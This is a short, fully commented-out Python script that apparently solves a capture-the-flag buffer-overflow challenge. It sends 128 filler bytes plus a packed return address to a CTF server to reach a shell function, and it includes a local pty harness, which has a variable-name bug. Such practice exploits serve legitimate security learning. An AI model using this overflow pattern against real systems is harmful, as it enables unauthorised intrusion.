# from pwn import *

# r = remote('ctf.j0n9hyun.xyz', 3001)

# shell = 0x0804849b
# payload = b'A' * 128 + p32(shell)
# r.send(payload)

# r.interactive()

# import struct
# import subprocess
# import os
# import pty

# def readline(fd):
#     res = ''
#     try:
#         while True:
#             ch = os.read(df, 1)
#             res += ch
#             if ch == '\n':
#                 return res
#     except:
#         raise

# def writeline(proc, data):
#     try:
#         proc.stdin.write(data + '\n')
#     except:
#         raise

# def p32(val):
#     return struct.pack("<I", val)

# def u32(data):
#     return struct.unpack("<I", data)[0]

# out_r, out_w = pty.openpty()
# s = subprocess.Popen("../Downloads/bof_basic2", stdin=subprocess.PIPE, stdout=out_w)

# writeline(s, b'aaaa')
# print (readline(out_r))